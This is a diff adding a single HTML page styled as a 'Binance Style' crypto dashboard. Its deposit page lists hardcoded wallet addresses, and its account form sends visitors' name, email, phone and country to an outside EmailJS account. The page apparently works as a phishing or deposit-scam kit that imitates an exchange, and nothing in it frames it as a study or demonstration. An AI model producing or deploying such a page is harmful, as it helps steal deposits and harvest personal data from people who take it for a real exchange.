@@ -1,0 +1,124 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Crypto Dashboard - Binance Style</title>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" />
+  <style>
+    body { background-color: #121212; color: #fff; font-family: 'Segoe UI', sans-serif; }
+    .page { display: none; padding: 2rem; }
+    .active { display: block !important; }
+    .crypto-card { background: #1e1e1e; padding: 1rem; border-radius: 10px; margin-bottom: 1rem; }
+    .blue-btn { background-color: #007bff; border: none; padding: 10px 20px; border-radius: 5px; color: white; }
+    .blue-btn:hover { background-color: #0056b3; }
+  </style>
+</head>
+<body>
+
+  <div id="page4" class="page active">
+    <h2>Main Dashboard</h2>
+    <button onclick="showPage('page21')" class="blue-btn">Deposit Funds</button>
+    <button onclick="showPage('page23')" class="blue-btn">Account Details</button>
+  </div>
+
+  <!-- PAGE 21: Deposit Funds -->
+  <div id="page21" class="page">
+    <h3>Deposit Funds</h3>
+    <div class="crypto-card">
+      <h4>Ethereum (ETH)</h4>
+      <img src="https://assets.coingecko.com/coins/images/279/large/ethereum.png" width="40" />
+      <p>Network: Ethereum</p>
+      <p>Address: <code>0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130</code></p>
+    </div>
+    <div class="crypto-card">
+      <h4>BNB Smart Chain (BNB)</h4>
+      <img src="https://assets.coingecko.com/coins/images/825/large/binance-coin-logo.png" width="40" />
+      <p>Network: BSC</p>
+      <p>Address: <code>0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130</code></p>
+    </div>
+    <div class="crypto-card">
+      <h4>Tether USDT (TRC20)</h4>
+      <img src="https://assets.coingecko.com/coins/images/325/large/Tether-logo.png" width="40" />
+      <p>Network: Tron TRC20</p>
+      <p>Address: <code>TSt7yoNwGYRbtMMfkSAHE6dPs1cd9rxcco</code></p>
+    </div>
+
+    <div class="crypto-card">
+      <h4>Live Market Chart</h4>
+      <div id="tradingview_chart" style="height:400px;"></div>
+    </div>
+    <button onclick="showPage('page4')" class="blue-btn mt-3">&larr; Back to Dashboard</button>
+  </div>
+
+  <!-- PAGE 23: Account Details -->
+  <div id="page23" class="page">
+    <h2>Account Details</h2>
+    <form id="accountForm">
+      <div class="mb-3">
+        <label class="form-label">Name</label>
+        <input type="text" class="form-control" id="accountName" placeholder="Full Name" required>
+      </div>
+      <div class="mb-3">
+        <label class="form-label">Email</label>
+        <input type="email" class="form-control" id="accountEmail" placeholder="Email" required>
+      </div>
+      <div class="mb-3">
+        <label class="form-label">Phone</label>
+        <input type="text" class="form-control" id="accountPhone" placeholder="Phone Number" required>
+      </div>
+      <div class="mb-3">
+        <label class="form-label">Country</label>
+        <input type="text" class="form-control" id="accountCountry" placeholder="Country" required>
+      </div>
+      <button type="submit" class="blue-btn">Save Details</button>
+    </form>
+    <button onclick="showPage('page4')" class="blue-btn mt-3">&larr; Back to Dashboard</button>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script src="https://s3.tradingview.com/tv.js"></script>
+  <script>
+    emailjs.init("ochPV1QVtay7TOdBA");
+
+    function showPage(id) {
+      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+      document.getElementById(id).classList.add('active');
+    }
+
+    // Load TradingView widget
+    new TradingView.widget({
+      container_id: "tradingview_chart",
+      width: "100%",
+      height: 400,
+      symbol: "BINANCE:ETHUSDT",
+      interval: "D",
+      timezone: "Etc/UTC",
+      theme: "dark",
+      style: "1",
+      locale: "en",
+      toolbar_bg: "#f1f3f6",
+      enable_publishing: false,
+      hide_top_toolbar: true,
+      allow_symbol_change: true,
+      save_image: false,
+    });
+
+    document.getElementById("accountForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      const data = {
+        name: document.getElementById("accountName").value,
+        email: document.getElementById("accountEmail").value,
+        phone: document.getElementById("accountPhone").value,
+        country: document.getElementById("accountCountry").value,
+      };
+
+      emailjs.send("service_78wwbgl", "template_omkmcio", data)
+        .then(() => alert("✅ Account details sent successfully."))
+        .catch(err => alert("❌ Failed to send account details."));
+    });
+  </script>
+
+</body>
+</html>
